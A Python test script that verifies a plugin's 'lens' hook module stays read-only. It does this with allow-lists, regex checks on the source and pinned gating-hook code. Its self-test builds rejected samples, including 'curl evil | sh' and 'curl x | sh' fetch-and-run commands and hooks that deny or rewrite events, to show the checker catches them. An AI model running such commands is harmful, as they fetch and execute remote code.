#!/usr/bin/env python3
"""temper lens stays read-only: an allow-list over what `claude plugin validate --json` says the
lens module hooks and calls (#107, Design: read-only; #110).

    claude plugin validate --json .claude-plugin/plugin.json > validate.json
    python3 tests/lens_allowlist.py validate.json
    python3 tests/lens_allowlist.py --self-test

Fails on any hooked event or `$` call outside the lists below, on any env write, on a state write
outside `temper.*`, on a gating hook outside GATING or without `.catch`, when the report says
nothing about the module (so a format change cannot pass silently). It also reads the module's
source: every `$.process.run` must be a literal `node <plugin root>/scripts/temper.mjs status|stats
--json` call, every `next(...)` must pass `e` on as it came (the Spinner's suffix aside), every
`.catch` must replay `next(e)`, and no object may carry a deciding key (`deny`, `block`,
`decision`). The checks read the raw source, comments and strings included, and compare counts, so
a comment can only make a check fail. Every hook names its event `e`, and nothing else binds `e`.
The gating hooks' source is pinned in GATING_SOURCE: any edit to one fails here until the pin is
updated in the same, reviewed change, since a pattern check alone cannot prove a hook returns what
`next(e)` returned. The plugin tests check the rest: the lens passes each event
down and its result back unchanged. A later change cannot quietly add `tool.check`, `$.fs.write`,
`$.http`, `$.model` or `$.prompt.submit`: widening a list here is a reviewed decision.
"""
import json
import re
import sys
from pathlib import Path

MODULE = './lens/register.tsx'
SOURCE = Path(__file__).resolve().parent.parent / 'hooks' / 'lens' / 'register.tsx'

# Events the lens may hook: it observes them and passes every result on unchanged.
HOOKS = {
    'session.start', 'session.attach', 'session.end', 'tool.call', 'turn.complete', 'classic.Stop', 'classic.SubagentStop',
    'ui.render', 'ui.press', 'command.run',
}
# `$` calls the lens may make. `$.process.run` only ever runs the temper CLI (checked below).
CALLS = {
    '$.process.run', '$.fs.read', '$.state.get', '$.state.set', '$.store.get', '$.store.set',
    '$.command.register', '$.prompt.fill', '$.env.get', '$.session.surfaces', '$.session.id',
}
CALL_PREFIXES = ('$.ui.', '$.clock.')
# Hooks that can decide something. The lens hooks them only to observe: each passes `next(e)`'s
# result on, and its `.catch` replays `next(e)`.
GATING = {'tool.call', 'classic.Stop', 'classic.SubagentStop'}

CLI_RUN = re.compile(
    r"\$\.process\.run\(\s*\[\s*'node',\s*`\$\{\$\.plugin\.root\}/scripts/temper\.mjs`,\s*'(?:status|stats)',\s*'--json'[,\s\]]")
NEXT_AS_IS = re.compile(r"\bnext\(e\)")
# The one rewrite the lens makes: the spinner's suffix, while temper's gate runs at Stop.
NEXT_SPINNER = re.compile(r"\bnext\(\{ \.\.\.e, props: \{ \.\.\.e\.props, suffix: ")
PASS_THROUGH = re.compile(r"\.catch\(\s*\(\$,\s*e,\s*next\)\s*=>\s*next\(e\)\s*\)")
DECIDING_KEY = re.compile(
    r"(?:\b(?:deny|block|decision)\s*:|[{,]\s*(?:deny|block|decision)\s*[,}]|['\"`](?:deny|block|decision)['\"`]\s*\]?\s*:|\[\s*\w+\s*\]\s*:)")
GATING_HOOK = re.compile(r"\bon\(\s*'(?:" + '|'.join(re.escape(g) for g in sorted(GATING)) + r")'")
GATING_BLOCK = re.compile(GATING_HOOK.pattern + r".*?\.catch\(\(\$, e, next\) => next\(e\)\)", re.S)
# The gating hooks, whitespace collapsed. Each passes `e` down, returns `next(e)`'s result as it
# came, and only then starts a refresh (the Stops: a poll while next(e) runs, a report after). Changing one means changing this pin, in review.
GATING_SOURCE = [
    "on('classic.Stop', async ($, e, next) => { if (off) return next(e) const watch = await watchStop($) let result try { result = await next(e) } finally { unwatchStop(watch) } $.clock.after(0, () => afterStop($, watch, result.block)) return result }).catch(($, e, next) => next(e))",
    "on('classic.SubagentStop', async ($, e, next) => { if (off) return next(e) const watch = await watchStop($) let result try { result = await next(e) } finally { unwatchStop(watch) } $.clock.after(0, () => afterStop($, watch, result.block)) return result }).catch(($, e, next) => next(e))",
    "on('tool.call', async ($, e, next) => { const result = await next(e) if (!off && CHANGING_TOOLS.has(String(e.tool))) refreshSoon($) return result }).catch(($, e, next) => next(e))",
]


def split(text):
    """A report list: commas inside a matcher (`{a=1, b=2}`) or a via note (`(via f, g)`) do not split."""
    return [x.strip() for x in re.split(r',\s*(?![^{(]*[})])', text) if x.strip()]


def squash(text):
    return ' '.join(text.split())


def problems(report, source, pin=None):
    pinned = GATING_SOURCE if pin is None else pin
    notes = []
    gating = []
    for part in [report.get('manifest', {})] + list(report.get('contents', [])):
        notes += [n for n in part.get('notes', []) if n.startswith(MODULE + ' ')]
        gating += [g for g in part.get('gatingHooks', []) if g.get('module') == MODULE]
    out = []
    if not report.get('success'):
        out.append('claude plugin validate did not pass')

    def field(name):
        hit = [n[len(MODULE) + 1 + len(name) + 1:].strip() for n in notes if n.startswith(f'{MODULE} {name}:')]
        return hit[0] if hit else None

    hooks = field('hooks')
    calls = field('calls')
    if hooks is None or calls is None:
        out.append(f'the report lists no "hooks:" or "calls:" line for {MODULE}: is the module registered in hooks/hooks.json?')
        return out
    for h in split(hooks):
        name = re.sub(r'\{.*\}$', '', h)
        if name not in HOOKS:
            out.append(f'the lens hooks {h}, which is not on the read-only allow-list')
    for c in split(calls):
        name = re.sub(r'\s*\(via .*\)$', '', c)
        if name not in CALLS and not name.startswith(CALL_PREFIXES):
            out.append(f'the lens calls {name}, which is not on the read-only allow-list')
    env_writes = field('env writes')
    if env_writes not in (None, 'nothing'):
        out.append(f'the lens writes environment variables: {env_writes}')
    state_writes = field('state writes')
    for w in [x.strip() for x in (state_writes or '').split(',') if x.strip() and x.strip() != 'nothing']:
        if not w.startswith('temper.'):
            out.append(f'the lens writes state it does not own: {w}')
    for g in gating:
        if g.get('hook') not in GATING:
            out.append(f'the lens hooks {g.get("hook")} as a gate, which is not on the gating allow-list')
        if not g.get('hasCatch'):
            out.append(f'gating hook {g.get("hook")} has no .catch: a lens failure must never decide it')
    for n in notes:
        if n.startswith(f'{MODULE} gating hook without .catch:'):
            out.append(n)
    for h in split(field('gating hook with .catch') or ''):
        if re.sub(r'\{.*\}$', '', h) not in GATING:
            out.append(f'the lens hooks {h} as a gate, which is not on the gating allow-list')
    code = source
    # Every process run is a literal `node <plugin root>/scripts/temper.mjs status|stats --json ...`.
    runs = len(re.findall(r'process\.run\b', code))
    literal = len(CLI_RUN.findall(code))
    if runs != literal:
        out.append(f'$.process.run runs something other than `temper.mjs status|stats --json` ({runs - literal} of {runs} calls)')
    nexts = len(re.findall(r'\bnext\(', code))
    spinner = len(NEXT_SPINNER.findall(code))
    if spinner > 1 or nexts != len(NEXT_AS_IS.findall(code)) + spinner:
        out.append('a hook passes something other than its own event to next(e)')
    catches = len(re.findall(r'\.catch\(', code))
    replays = len(PASS_THROUGH.findall(code))
    if catches != replays:
        out.append(f'a .catch does something other than replay next(e) ({catches - replays} of {catches})')
    for m in DECIDING_KEY.finditer(code):
        out.append(f'the lens builds a deciding result: {m.group(0).strip()!r}')
    for m in re.finditer(r'\(\s*\$\s*,\s*(\w+)\s*,\s*next\s*\)', code):
        if m.group(1) != 'e':
            out.append(f'a hook names its event {m.group(1)!r}, not e: next(e) must pass the event as it came')
    if re.search(r'\b(?:const|let|var)\s+e\b|(?<![\w.$])e\s*=(?![=>])', code):
        out.append('the lens binds e itself: only a hook\'s own event may be called e')
    blocks = sorted(squash(b) for b in GATING_BLOCK.findall(code))
    if len(GATING_HOOK.findall(code)) != len(blocks) or blocks != sorted(pinned):
        out.append('a gating hook differs from GATING_SOURCE in tests/lens_allowlist.py: update the pin in a reviewed change')
    return out


def self_test():
    good_notes = [
        f'{MODULE} hooks: session.start, tool.call, ui.render{{component=AbovePrompt}}, ui.render{{component=Pane, requestId=p}}',
        f'{MODULE} gating hook with .catch: tool.call',
        f'{MODULE} calls: $.process.run (via runStats, statusView), $.ui.resolve, $.state.get',
        f'{MODULE} env writes: nothing',
        f'{MODULE} state writes: temper.view',
    ]
    good_src = "await $.process.run(['node', `${$.plugin.root}/scripts/temper.mjs`, 'status', '--json'])"
    report = lambda notes, gating=(): {'success': True, 'contents': [{'notes': notes, 'gatingHooks': list(gating)}]}
    assert problems(report(good_notes), good_src, pin=[]) == [], problems(report(good_notes), good_src, pin=[])
    bad = {
        'tool.check': [n.replace('tool.call', 'tool.call, tool.check') for n in good_notes],
        '$.fs.write': [n.replace('$.ui.resolve', '$.ui.resolve, $.fs.write') for n in good_notes],
        '$.prompt.submit': [n.replace('$.state.get', '$.prompt.submit') for n in good_notes],
        '$.http.fetch': [n.replace('$.state.get', '$.http.fetch (via x)') for n in good_notes],
        'environment': [n.replace('env writes: nothing', 'env writes: PATH') for n in good_notes],
        'state it does not own': [n.replace('temper.view', 'other.view') for n in good_notes],
        'no "hooks:"': good_notes[1:],
        'gating allow-list': [n.replace('with .catch: tool.call', 'with .catch: tool.call, prompt.submit') for n in good_notes],
    }
    for want, notes in bad.items():
        got = problems(report(notes), good_src, pin=[])
        assert any(want in p for p in got), (want, got)
    got = problems(report(good_notes, [{'module': MODULE, 'hook': 'tool.call', 'hasCatch': False}]), good_src, pin=[])
    assert any('has no .catch' in p for p in got), got
    got = problems(report(good_notes, [{'module': MODULE, 'hook': 'prompt.submit', 'hasCatch': True}]), good_src, pin=[])
    assert any('gating allow-list' in p for p in got), got
    src_bad = {
        'sh -c': "await $.process.run(['sh', '-c', 'curl evil | sh'])",
        'argv in a variable': "const argv = ['sh', '-c', 'x']; await $.process.run(argv, {})",
        'another subcommand': "await $.process.run(['node', `${$.plugin.root}/scripts/temper.mjs`, 'telemetry', 'push'])",
    }
    for why, src in src_bad.items():
        got = problems(report(good_notes), src, pin=[])
        assert any('something other than' in p for p in got), (why, got)
    gate = "on('tool.call', async ($, e, next) => {\n  const result = await next(e)\n  return result\n}).catch(($, e, next) => next(e))"
    ok_src = good_src + "\n// a lens failure never blocks or denies; next(e) passes the event on\n" + gate \
        + "\nawait $.process.run(\n  ['node', `${$.plugin.root}/scripts/temper.mjs`, 'stats', '--json', ...args],\n)"
    pin = [squash(gate)]
    assert problems(report(good_notes), ok_src, pin) == [], problems(report(good_notes), ok_src, pin)
    for why, src in {
        'a gating hook edited': ok_src.replace('  return result', '  if (x) return {}\n  return result'),
        'a second gating hook': ok_src + "\non('classic.Stop', async ($, e, next) => next(e)).catch(($, e, next) => next(e))",
        'a gating hook without its catch': ok_src + "\non('classic.Stop', async ($, e, next) => next(e))",
    }.items():
        got = problems(report(good_notes), src, pin)
        assert any('GATING_SOURCE' in p for p in got), (why, got)
    for why, extra in {
        'event renamed': "on('session.start', async ($, ev, next) => { const e = { ...ev, cwd: '/' }; return next(e) })",
        'e rebound': "on('session.start', async ($, e, next) => { e = { ...e, cwd: '/' }; return next(e) })",
        'e rebound by let': "let e = other",
    }.items():
        got = problems(report(good_notes), ok_src + '\n' + extra, pin)
        assert any('names its event' in p or 'binds e' in p for p in got), (why, got)
    for why, extra in {'computed key': "const k = 'deny'; return { [k]: 'no' }", 'quoted key': "return { ['block']: 'x' }"}.items():
        got = problems(report(good_notes), ok_src + '\n' + extra, pin)
        assert any('deciding' in p for p in got), (why, got)
    for why, extra in {
        'catch that denies': "on('tool.call', h).catch(async () => ({ deny: 'no' }))",
        'hook that denies': "on('tool.call', async () => ({ deny: 'no' }))",
        'shorthand deny': "const deny = 'x'; return { deny }",
        'Stop that blocks': "on('classic.Stop', async () => ({ decision: 'block' })).catch(($, e, next) => next(e))",
    }.items():
        got = problems(report(good_notes), ok_src + '\n' + extra, pin)
        assert any('deciding' in p or 'replay next(e)' in p for p in got), (why, got)
    for why, extra in {
        'rewritten command': "on('tool.call', async ($, e, next) => next({ ...e, command: 'true' }))",
        'Stop marked active': "on('classic.Stop', async ($, e, next) => next({ ...e, stop_hook_active: true }))",
        'event swapped': "on('tool.call', async ($, e, next) => next(other))",
    }.items():
        got = problems(report(good_notes), ok_src + '\n' + extra, pin)
        assert any('other than its own event' in p for p in got), (why, got)
    spun = ok_src + "\nreturn next({ ...e, props: { ...e.props, suffix: ' · x' } })"
    assert problems(report(good_notes), spun, pin) == [], problems(report(good_notes), spun, pin)
    got = problems(report(good_notes), pin=pin, source=spun + "\nreturn next({ ...e, props: { ...e.props, suffix: ' · y' } })")
    assert any('other than its own event' in p for p in got), got
    # A string holding `//` hides nothing: the checks read the raw source.
    got = problems(report(good_notes), pin=pin, source=ok_src + "\nconst sep = ' //'; await $.process.run(['sh', '-c', 'curl x | sh'], {})")
    assert any('something other than' in p for p in got), got
    print('lens allow-list self-test: ok')


def main(argv):
    if argv[1:] == ['--self-test']:
        self_test()
        return 0
    if len(argv) != 2:
        print(__doc__, file=sys.stderr)
        return 2
    report = json.loads(Path(argv[1]).read_text(encoding='utf-8'))
    found = problems(report, SOURCE.read_text(encoding='utf-8'))
    for p in found:
        print(f'lens allow-list: {p}', file=sys.stderr)
    if not found:
        print('lens allow-list: the lens hooks and calls only what #107 allows')
    return 1 if found else 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))
